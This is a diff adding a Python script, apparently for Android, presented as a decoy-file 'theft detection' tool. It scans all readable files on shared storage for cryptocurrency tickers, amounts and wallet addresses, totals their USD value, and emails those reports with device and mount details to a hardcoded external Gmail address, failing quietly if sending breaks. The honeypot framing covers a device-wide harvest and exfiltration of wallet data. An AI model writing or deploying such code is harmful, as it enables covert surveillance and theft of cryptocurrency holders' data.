@@ -1,0 +1,352 @@
+import os
+import re
+import time
+import uuid
+import json
+import smtplib
+import platform
+from email.message import EmailMessage
+from datetime import datetime
+
+# --- CONFIGURATION ---
+
+# Directories
+SCAN_DIR = "/storage/emulated/0/"
+OUTPUT_DIR = "/storage/emulated/0/Documents/crypto_extraction_reports"
+DECOY_DIR = "/storage/emulated/0/Documents/crypto_decoys"
+
+# Output files
+TOKENS_FILE = "tokens_found.txt"
+TRANSACTIONS_FILE = "transactions_found.txt"
+ADDRESSES_FILE = "addresses_found.txt"
+SUMMARY_FILE = "crypto_totals_usd.txt"
+
+# Honeypot (decoy) settings
+DECOY_FILES = [
+    "wallet_backup.txt",
+    "secret_keys.txt",
+    "transfer_instructions.txt"
+]
+DECOY_TEMPLATE = (
+    "DEC0Y-ID: {id}\n"
+    "This is a decoy file created for theft detection.\n"
+    "Marker: {marker}\n"
+    "Created: {created}\n"
+    "If this file is modified or removed, an alert will be sent.\n"
+)
+DECOY_CHECK_INTERVAL = 30  # seconds between checks
+
+# Crypto extraction settings
+TOKENS = ["BTC", "ETH", "USDT", "USDC", "BNB", "XRP", "LTC", "DOGE", "ADA"]
+CRYPTO_USD_RATES = {
+    "BTC": 30000.0,
+    "ETH": 2000.0,
+    "USDT": 1.0,
+    "USDC": 1.0,
+    "BNB": 300.0,
+    "XRP": 0.5,
+    "LTC": 100.0,
+    "DOGE": 0.07,
+    "ADA": 0.4,
+}
+
+# Regex
+TOKEN_PATTERN = re.compile(r"\b(" + "|".join(TOKENS) + r")\b", re.IGNORECASE)
+TRANSACTION_PATTERN = re.compile(r"\b(" + "|".join(TOKENS) + r")\s*([0-9]*\.?[0-9]+)", re.IGNORECASE)
+BTC_ADDRESS_PATTERN = re.compile(r"\b([13][a-km-zA-HJ-NP-Z1-9]{25,34})\b")
+ETH_ADDRESS_PATTERN = re.compile(r"\b0x[a-fA-F0-9]{40}\b")
+
+# Email (set these)
+SMTP_HOST = "smtp.example.com"
+SMTP_PORT = 587
+SMTP_USER = "your_smtp_user@example.com"
+SMTP_PASS = "your_smtp_password"
+EMAIL_TO = "mikeneed058@gmail.com"
+EMAIL_FROM = SMTP_USER
+
+# --- HELPERS ---
+
+def ensure_dirs():
+    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    os.makedirs(DECOY_DIR, exist_ok=True)
+
+def scan_files(directory):
+    files = []
+    for root, dirs, filenames in os.walk(directory, topdown=True):
+        filtered_dirs = []
+        for d in dirs:
+            path = os.path.join(root, d)
+            if os.access(path, os.R_OK):
+                filtered_dirs.append(d)
+        dirs[:] = filtered_dirs
+        for filename in filenames:
+            filepath = os.path.join(root, filename)
+            if os.access(filepath, os.R_OK):
+                files.append(filepath)
+    return files
+
+def extract_from_text(text):
+    tokens_found = set()
+    transactions_found = set()
+    addresses_found = set()
+    totals = {}
+    for match in TOKEN_PATTERN.finditer(text):
+        tokens_found.add(match.group(1).upper())
+    for match in TRANSACTION_PATTERN.finditer(text):
+        token = match.group(1).upper()
+        try:
+            amount = float(match.group(2))
+        except:
+            amount = 0.0
+        transactions_found.add(f"{token} {amount}")
+        totals[token] = totals.get(token, 0.0) + amount
+    addresses_found.update(BTC_ADDRESS_PATTERN.findall(text))
+    addresses_found.update(ETH_ADDRESS_PATTERN.findall(text))
+    return tokens_found, transactions_found, addresses_found, totals
+
+def save_set_file(path, data_set):
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w", encoding="utf-8") as f:
+        for item in sorted(data_set):
+            f.write(str(item) + "\n")
+
+def save_totals_with_usd(path, totals):
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    total_usd = 0.0
+    with open(path, "w", encoding="utf-8") as f:
+        f.write("Token | Total Amount | Estimated USD Value\n")
+        f.write("-------------------------------------------\n")
+        for token, amount in sorted(totals.items()):
+            rate = CRYPTO_USD_RATES.get(token, 0.0)
+            usd_value = amount * rate
+            total_usd += usd_value
+            f.write(f"{token} | {amount:.8f} | ${usd_value:.2f}\n")
+        f.write("-------------------------------------------\n")
+        f.write(f"Total Estimated USD Value: ${total_usd:.2f}\n")
+
+def send_email(subject, body, attachments=None):
+    msg = EmailMessage()
+    msg["From"] = EMAIL_FROM
+    msg["To"] = EMAIL_TO
+    msg["Subject"] = subject
+    msg.set_content(body)
+    attachments = attachments or []
+    for path in attachments:
+        try:
+            with open(path, "rb") as af:
+                data = af.read()
+            maintype = "application"
+            subtype = "octet-stream"
+            msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=os.path.basename(path))
+        except Exception:
+            continue
+    try:
+        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30) as server:
+            server.starttls()
+            server.login(SMTP_USER, SMTP_PASS)
+            server.send_message(msg)
+    except Exception as e:
+        # If emailing fails, survive quietly (or log to file)
+        log_path = os.path.join(OUTPUT_DIR, "email_errors.log")
+        with open(log_path, "a", encoding="utf-8") as le:
+            le.write(f"{datetime.utcnow().isoformat()} - Failed to send email: {e}\n")
+
+def collect_device_info():
+    info = {}
+    info["timestamp_utc"] = datetime.utcnow().isoformat()
+    try:
+        info["platform"] = platform.platform()
+        info["system"] = platform.system()
+        info["node"] = platform.node()
+        info["release"] = platform.release()
+        info["processor"] = platform.processor()
+    except Exception:
+        pass
+    # Add accessible mount points listing (best-effort)
+    try:
+        mounts = []
+        with open("/proc/mounts", "r") as m:
+            for line in m:
+                parts = line.split()
+                if parts:
+                    mounts.append((parts[0], parts[1]))
+        info["mounts"] = mounts[:20]
+    except Exception:
+        pass
+    return info
+
+# --- DECOY / HONEYPOT MANAGEMENT ---
+
+def create_decoys_if_missing():
+    created = []
+    for name in DECOY_FILES:
+        path = os.path.join(DECOY_DIR, name)
+        if not os.path.exists(path):
+            decoy_id = str(uuid.uuid4())
+            marker = uuid.uuid4().hex
+            created_time = datetime.utcnow().isoformat()
+            content = DECOY_TEMPLATE.format(id=decoy_id, marker=marker, created=created_time)
+            try:
+                with open(path, "w", encoding="utf-8") as f:
+                    f.write(content)
+                # Save metadata
+                meta = {"id": decoy_id, "marker": marker, "created": created_time, "path": path}
+                meta_path = path + ".meta.json"
+                with open(meta_path, "w", encoding="utf-8") as mf:
+                    json.dump(meta, mf)
+                created.append(path)
+            except Exception:
+                continue
+    return created
+
+def load_decoy_state():
+    state = {}
+    for name in DECOY_FILES:
+        path = os.path.join(DECOY_DIR, name)
+        meta_path = path + ".meta.json"
+        if os.path.exists(meta_path):
+            try:
+                with open(meta_path, "r", encoding="utf-8") as mf:
+                    meta = json.load(mf)
+            except Exception:
+                meta = {}
+        else:
+            meta = {}
+        try:
+            if os.path.exists(path):
+                st = os.stat(path)
+                state[path] = {
+                    "exists": True,
+                    "mtime": st.st_mtime,
+                    "size": st.st_size,
+                    "meta": meta
+                }
+            else:
+                state[path] = {
+                    "exists": False,
+                    "mtime": None,
+                    "size": 0,
+                    "meta": meta
+                }
+        except Exception:
+            state[path] = {"exists": False, "mtime": None, "size": 0, "meta": meta}
+    return state
+
+# --- MAIN WORKFLOW ---
+
+def perform_extraction():
+    tokens_all = set()
+    transactions_all = set()
+    addresses_all = set()
+    totals_all = {}
+    files = scan_files(SCAN_DIR)
+    for file_path in files:
+        try:
+            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                content = f.read()
+            tokens, transactions, addresses, totals = extract_from_text(content)
+            tokens_all.update(tokens)
+            transactions_all.update(transactions)
+            addresses_all.update(addresses)
+            for k, v in totals.items():
+                totals_all[k] = totals_all.get(k, 0.0) + v
+        except Exception:
+            continue
+    save_set_file(os.path.join(OUTPUT_DIR, TOKENS_FILE), tokens_all)
+    save_set_file(os.path.join(OUTPUT_DIR, TRANSACTIONS_FILE), transactions_all)
+    save_set_file(os.path.join(OUTPUT_DIR, ADDRESSES_FILE), addresses_all)
+    save_totals_with_usd(os.path.join(OUTPUT_DIR, SUMMARY_FILE), totals_all)
+    return {
+        "tokens": len(tokens_all),
+        "transactions": len(transactions_all),
+        "addresses": len(addresses_all),
+        "totals": totals_all
+    }
+
+def monitor_decoys(loop_interval=DECOY_CHECK_INTERVAL):
+    previous = load_decoy_state()
+    while True:
+        time.sleep(loop_interval)
+        current = load_decoy_state()
+        events = []
+        for path, cur in current.items():
+            prev = previous.get(path)
+            # If previously existed and now missing -> deletion event
+            if prev and prev.get("exists") and not cur.get("exists"):
+                events.append({
+                    "type": "deleted",
+                    "path": path,
+                    "meta": prev.get("meta"),
+                    "time": datetime.utcnow().isoformat()
+                })
+                # Recreate decoy immediately for continued monitoring
+                try:
+                    decoy_id = prev.get("meta", {}).get("id", str(uuid.uuid4()))
+                    marker = prev.get("meta", {}).get("marker", uuid.uuid4().hex)
+                    created_time = datetime.utcnow().isoformat()
+                    content = DECOY_TEMPLATE.format(id=decoy_id, marker=marker, created=created_time)
+                    with open(path, "w", encoding="utf-8") as f:
+                        f.write(content)
+                    meta = {"id": decoy_id, "marker": marker, "created": created_time, "path": path}
+                    with open(path + ".meta.json", "w", encoding="utf-8") as mf:
+                        json.dump(meta, mf)
+                except Exception:
+                    pass
+            # If exists and mtime changed -> modification event
+            elif cur.get("exists") and prev and prev.get("mtime") and cur.get("mtime") and cur.get("mtime") != prev.get("mtime"):
+                events.append({
+                    "type": "modified",
+                    "path": path,
+                    "meta": cur.get("meta"),
+                    "prev_mtime": prev.get("mtime"),
+                    "cur_mtime": cur.get("mtime"),
+                    "time": datetime.utcnow().isoformat()
+                })
+            # If previously missing and now exists -> created (possible restoration)
+            elif prev and not prev.get("exists") and cur.get("exists"):
+                events.append({
+                    "type": "created",
+                    "path": path,
+                    "meta": cur.get("meta"),
+                    "time": datetime.utcnow().isoformat()
+                })
+        if events:
+            device_info = collect_device_info()
+            body = {
+                "events": events,
+                "device_info": device_info
+            }
+            text_body = "Decoy events detected:\n\n" + json.dumps(body, indent=2, default=str)
+            # Attach the current summary files if present
+            attachments = []
+            for fname in [TOKENS_FILE, TRANSACTIONS_FILE, ADDRESSES_FILE, SUMMARY_FILE]:
+                p = os.path.join(OUTPUT_DIR, fname)
+                if os.path.exists(p):
+                    attachments.append(p)
+            # Send email
+            send_email("Alert: Decoy file event detected", text_body, attachments=attachments)
+        previous = current
+
+def main():
+    ensure_dirs()
+    created = create_decoys_if_missing()
+    if created:
+        print("Created decoy files:", created)
+    else:
+        print("Decoy files present or previously created.")
+    print("Performing initial extraction (this may take a while)...")
+    summary = perform_extraction()
+    print("Extraction summary:", summary)
+    print("Starting decoy monitor loop (press Ctrl+C to stop)...")
+    try:
+        monitor_decoys()
+    except KeyboardInterrupt:
+        print("Monitoring stopped by user.")
+    except Exception as e:
+        # Log unexpected errors
+        err_log = os.path.join(OUTPUT_DIR, "monitor_errors.log")
+        with open(err_log, "a", encoding="utf-8") as el:
+            el.write(f"{datetime.utcnow().isoformat()} - Monitor crashed: {e}\n")
+
+if __name__ == "__main__":
+    main()
